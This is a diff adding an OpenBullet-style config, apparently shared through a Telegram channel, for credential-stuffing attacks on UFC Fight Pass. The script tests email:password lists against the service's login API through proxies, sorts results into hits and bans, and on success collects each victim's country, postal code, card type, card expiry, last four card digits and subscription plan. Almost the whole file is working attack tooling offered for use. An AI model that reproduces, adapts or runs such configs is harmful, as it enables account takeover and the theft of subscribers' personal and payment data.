@@ -1,0 +1,160 @@
+[SETTINGS]
+{
+  "Name": "UFC TV",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-13T23:05:00.8195563+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | High CPM | Move Free To Custom | Many Retry Normal | CPM Rate: 100_1500",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Post REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/login" 
+  CONTENT "{\"id\":\"<USER>\",\"secret\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US" 
+  HEADER "app: dice" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 58" 
+  HEADER "origin: https://ufcfightpass.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "realm: dce.ufc" 
+  HEADER "referer: https://ufcfightpass.com/login" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36" 
+  HEADER "x-api-key: 857a1e5d-e35e-4fdf-805b-a87b6f8364bf" 
+  HEADER "x-app-var: 5.24.8" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "loginnotfound" 
+    KEY "NOT_FOUND" 
+  KEYCHAIN Success OR 
+    KEY "instruct" 
+    KEY "authorisationToken" 
+  KEYCHAIN Retry OR 
+    KEY "500" 
+    KEY "403" 
+  KEYCHAIN Ban OR 
+    KEY "429" 
+
+PARSE "<SOURCE>" JSON "authorisationToken" -> VAR "Tok" 
+
+#GetAdress REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/user/address" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US" 
+  HEADER "app: dice" 
+  HEADER "authorization: Bearer <Tok>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://ufcfightpass.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "realm: dce.ufc" 
+  HEADER "referer: https://ufcfightpass.com/account?section=accountDetails" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36" 
+  HEADER "x-api-key: 857a1e5d-e35e-4fdf-805b-a87b6f8364bf" 
+  HEADER "x-app-var: 5.24.8" 
+
+#country PARSE "<SOURCE>" JSON "countryCode" CreateEmpty=FALSE -> CAP "Country" 
+
+#Postal_Code PARSE "<SOURCE>" JSON "postalCode" CreateEmpty=FALSE -> CAP "Postal Code" 
+
+#GetCards REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/customer/cards" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US" 
+  HEADER "app: dice" 
+  HEADER "authorization: Bearer <Tok>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://ufcfightpass.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "realm: dce.ufc" 
+  HEADER "referer: https://ufcfightpass.com/account?section=paymentDetails" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36" 
+  HEADER "x-api-key: 857a1e5d-e35e-4fdf-805b-a87b6f8364bf" 
+  HEADER "x-app-var: 5.24.8" 
+
+#cardType PARSE "<SOURCE>" JSON "cardType" CreateEmpty=FALSE -> CAP "Card Type" 
+
+#expiryYear PARSE "<SOURCE>" JSON "expiryYear" -> VAR "expiryYear" 
+
+#expiryMonth PARSE "<SOURCE>" JSON "expiryMonth" -> VAR "expiryMonth" 
+
+#Expire_Card_Time FUNCTION Constant "<expiryMonth>/<expiryYear>" -> CAP "Expire Card Time" 
+
+#last4Digits PARSE "<SOURCE>" JSON "last4Digits" CreateEmpty=FALSE -> CAP "last4Digits" 
+
+#Get_Sub REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/user/licence" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US" 
+  HEADER "app: dice" 
+  HEADER "authorization: Bearer <Tok>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://ufcfightpass.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "realm: dce.ufc" 
+  HEADER "referer: https://ufcfightpass.com/account?section=subscriptions" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36" 
+  HEADER "x-api-key: 857a1e5d-e35e-4fdf-805b-a87b6f8364bf" 
+  HEADER "x-app-var: 5.24.8" 
+
+#Plan PARSE "<SOURCE>" JSON "type" CreateEmpty=FALSE -> CAP "Plan" 
+
+#Time_Of_Plan PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Time Of Plan" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "type" 
+
+#CC FUNCTION Constant "@BruteForce " -> CAP " Telegram Channel: " 
+
